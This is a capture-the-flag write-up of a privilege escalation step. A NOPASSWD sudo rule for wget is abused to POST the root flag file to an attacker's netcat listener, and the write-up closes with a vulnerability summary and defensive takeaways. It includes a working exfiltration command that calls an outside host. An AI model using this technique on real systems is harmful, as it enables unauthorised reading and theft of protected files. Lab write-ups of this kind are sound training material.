⬆️ PRIVESC

📦 Privilege Escalation — sudo wget

Check sudo permissions

jessie@target:~$ sudo -l
(root) NOPASSWD: /usr/bin/wget

wget can be run as root without a password. Use it to exfiltrate the root flag via HTTP POST.

Set up a listener (attacker)

🔔$ nc -lvnp 8080
listening on [any] 8080 ...

Exfiltrate root flag (target)

jessie@target:~$ sudo wget --post-file=/root/root_flag.txt http://10.x.x.x:8080/

The root flag is received in the netcat listener.

🔬 Vulnerability Chain Summary

  • Sensitive File Exposure — SSH private key exposed in /sitemap/.ssh/id_rsa
  • Open SSH Key — Private key had no passphrase, allowing immediate login
  • Sudo Misconfiguration — User can run wget as root via NOPASSWD
  • File Exfiltration via wget — --post-file reads any file as root and sends it over HTTP

🎯 Key Takeaways

  • Never expose SSH keys — Even in a subdirectory, .ssh directories should be blocked by web server config
  • wget with --post-file is a powerful privesc primitive when run as sudo
  • Always check sudo -l — Unusual binaries with NOPASSWD are a common CTF privesc vector
